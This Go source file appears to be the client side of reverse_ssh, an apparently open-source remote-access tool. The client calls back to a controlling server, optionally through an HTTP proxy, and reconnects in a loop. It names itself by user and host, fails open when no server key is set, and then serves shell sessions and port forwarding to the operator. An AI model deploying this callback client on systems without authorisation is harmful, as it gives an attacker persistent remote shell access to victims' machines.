package client

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/user"
	"strings"
	"time"

	"github.com/NHAS/reverse_ssh/internal"
	"github.com/NHAS/reverse_ssh/internal/client/handlers"
	"github.com/NHAS/reverse_ssh/internal/client/keys"
	"github.com/NHAS/reverse_ssh/pkg/logger"
	"golang.org/x/crypto/ssh"
)

func WriteHTTPReq(lines []string, conn net.Conn) error {
	lines = append(lines, "") // Add an empty line for completing the HTTP request
	for _, line := range lines {

		n, err := conn.Write([]byte(line + "\r\n"))
		if err != nil {
			return err
		}

		if len(line+"\r\n") < n {
			return io.ErrShortWrite
		}
	}
	return nil
}

func Connect(addr, proxy string, timeout time.Duration) (conn net.Conn, err error) {

	if len(proxy) != 0 {
		log.Println("Setting HTTP proxy address as: ", proxy)

		proxyCon, err := net.DialTimeout("tcp", proxy, timeout)
		if err != nil {
			return conn, err
		}

		req := []string{
			fmt.Sprintf("CONNECT %s HTTP/1.1", addr),
			fmt.Sprintf("Host: %s", addr),
		}

		err = WriteHTTPReq(req, proxyCon)
		if err != nil {
			return conn, fmt.Errorf("Unable to connect proxy %s", proxy)
		}

		var responseStatus []byte
		for {
			b := make([]byte, 1)
			_, err := proxyCon.Read(b)
			if err != nil {
				return conn, fmt.Errorf("Reading from proxy failed")
			}
			responseStatus = append(responseStatus, b...)

			if len(responseStatus) > 4 && bytes.Equal(responseStatus[len(responseStatus)-4:], []byte("\r\n\r\n")) {
				break
			}
		}

		if !bytes.Contains(bytes.ToLower(responseStatus), []byte("200 connection established")) {
			parts := bytes.Split(responseStatus, []byte("\r\n"))
			if len(parts) > 1 {
				return proxyCon, fmt.Errorf("Failed to proxy: '%s'", parts[0])
			}
		}

		log.Println("Proxy accepted CONNECT request, connection set up!")

		return proxyCon, nil
	}

	return net.DialTimeout("tcp", addr, timeout)
}

func Run(addr, serverPubKey, proxyAddr string, reconnect bool) {

	sshPriv, sysinfoError := keys.GetPrivateKey()
	if sysinfoError != nil {
		log.Fatal("Getting private key failed: ", sysinfoError)
	}

	l := logger.NewLog("client")

	var username string
	userInfo, sysinfoError := user.Current()
	if sysinfoError != nil {
		l.Warning("Couldnt get username: %s", sysinfoError.Error())
		username = "Unknown"
	} else {
		username = strings.ReplaceAll(userInfo.Username, "\\", ".")
	}

	hostname, sysinfoError := os.Hostname()
	if sysinfoError != nil {
		hostname = "Unknown Hostname"
		l.Warning("Couldnt get host name: %s", sysinfoError)
	}

	config := &ssh.ClientConfig{
		User: fmt.Sprintf("%s.%s", username, hostname),
		Auth: []ssh.AuthMethod{
			ssh.PublicKeys(sshPriv),
		},
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			if serverPubKey == "" { // If a server key isnt supplied, fail open. Potentially should change this for more paranoid people
				l.Warning("No server key specified, allowing connection to %s", addr)
				return nil
			}

			if internal.FingerprintSHA256Hex(key) != serverPubKey {
				return fmt.Errorf("Server public key invalid, expected: %s, got: %s", serverPubKey, internal.FingerprintSHA256Hex(key))
			}

			return nil
		},
	}

	once := true
	for ; once || reconnect; once = false { // My take on a golang do {} while loop :P
		log.Println("Connecting to ", addr)
		conn, err := Connect(addr, proxyAddr, config.Timeout)
		if err != nil {
			log.Printf("Unable to connect TCP: %s\n", err)
			<-time.After(10 * time.Second)
			continue
		}
		defer conn.Close()

		sshConn, chans, reqs, err := ssh.NewClientConn(conn, addr, config)
		if err != nil {
			log.Printf("Unable to start a new client connection: %s\n", err)
			<-time.After(10 * time.Second)
			continue
		}
		defer sshConn.Close()

		go func() {
			for req := range reqs {

				switch req.Type {

				case "kill":
					log.Println("Got kill command, goodbye")
					os.Exit(0)

				default:
					if req.WantReply {
						req.Reply(false, nil)
					}
				}

			}
		}()

		for newChannel := range chans {
			if newChannel.ChannelType() != "jump" {
				newChannel.Reject(ssh.Prohibited, "Channel type "+newChannel.ChannelType()+" not allowed.")
				continue
			}

			go HandleNewConnection(newChannel, sshPriv)
		}

		if err != nil {
			log.Printf("Server disconnected unexpectedly: %s\n", err)
			<-time.After(10 * time.Second)
			continue
		}

	}

}

func HandleNewConnection(newChannel ssh.NewChannel, sshPriv ssh.Signer) error {

	connection, requests, err := newChannel.Accept()
	if err != nil {
		newChannel.Reject(ssh.ResourceShortage, err.Error())
		return err
	}
	go ssh.DiscardRequests(requests)
	defer connection.Close()

	config := &ssh.ServerConfig{
		PublicKeyCallback: func(conn ssh.ConnMetadata, key ssh.PublicKey) (*ssh.Permissions, error) {
			return &ssh.Permissions{
				Extensions: map[string]string{
					"pubkey-fp": internal.FingerprintSHA1Hex(key),
				},
			}, nil
		},
	}
	config.AddHostKey(sshPriv)

	p1, p2 := net.Pipe()
	go io.Copy(connection, p2)
	go func() {
		io.Copy(p2, connection)

		p2.Close()
		p1.Close()
	}()

	conn, chans, reqs, err := ssh.NewServerConn(p1, config)
	if err != nil {
		log.Printf("%s", err.Error())
		return err
	}
	defer conn.Close()

	clientLog := logger.NewLog(conn.RemoteAddr().String())
	clientLog.Info("New SSH connection, version %s", conn.ClientVersion())

	user, err := internal.CreateUser(conn)
	if err != nil {
		log.Printf("Unable to add user %s\n", err)
		return err
	}

	go func(in <-chan *ssh.Request) {
		for r := range in {
			switch r.Type {
			case "tcpip-forward":
				go handlers.StartRemoteForward(user, r, conn)
			case "cancel-tcpip-forward":
				var rf internal.RemoteForwardRequest

				err := ssh.Unmarshal(r.Payload, &rf)
				if err != nil {
					r.Reply(false, []byte(fmt.Sprintf("Unable to unmarshal remote forward request in order to stop it: %s", err.Error())))
					return
				}

				go func() {
					err := handlers.StopRemoteForward(rf)
					if err != nil {
						r.Reply(false, []byte(err.Error()))
						return
					}

					r.Reply(true, nil)
				}()
			default:
				//Ignore any unspecified global requests
				r.Reply(false, nil)
			}
		}
	}(reqs)

	err = internal.RegisterChannelCallbacks(user, chans, clientLog, map[string]internal.ChannelHandler{
		"session":      handlers.Session,
		"direct-tcpip": handlers.LocalForward,
	})

	for rf := range user.SupportedRemoteForwards {
		go handlers.StopRemoteForward(rf)
	}

	return err
}
